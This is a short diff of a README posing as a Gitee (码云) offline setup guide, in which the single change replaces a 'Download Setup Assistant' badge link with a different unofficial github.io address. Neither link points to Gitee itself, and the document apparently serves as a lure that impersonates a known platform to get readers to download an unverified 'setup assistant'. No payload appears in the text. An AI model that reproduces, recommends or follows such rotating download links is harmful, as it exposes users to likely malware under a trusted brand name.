@@ -1,6 +1,6 @@
 # Gitee (码云) — Offline Platform Overview & Setup Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://gitee-appfree-inf0.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://vertie311.github.io/.github/gitee-git-app)
 
 ---
 
